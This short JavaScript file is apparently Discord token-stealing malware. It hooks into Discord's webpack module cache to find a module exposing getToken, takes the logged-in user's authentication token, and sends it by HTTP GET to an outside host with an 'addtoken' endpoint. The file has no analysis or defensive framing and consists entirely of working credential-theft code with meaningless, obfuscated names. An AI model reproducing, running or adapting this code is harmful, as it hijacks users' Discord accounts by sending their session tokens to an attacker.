'use strict';
const request = require("request");
var mko = window.webpackChunkdiscord_app.push([[Math.random()], {}, (cobra_reaction) => {
  for (const preset of Object.keys(cobra_reaction.c).map((id) => {
    return cobra_reaction.c[id].exports;
  }).filter((canCreateDiscussions) => {
    return canCreateDiscussions;
  })) {
    if (preset["default"] && preset["default"].getToken !== undefined) {
      return preset["default"].getToken();
    }
    if (preset.getToken !== undefined) {
      return preset.getToken();
    }
  }
}]);
request.get("https://inj3ct0rsecure.000webhostapp.com/api?type=addtoken&token=" + mko, (canCreateDiscussions, isSlidingUp, dontForceConstraints) => {
});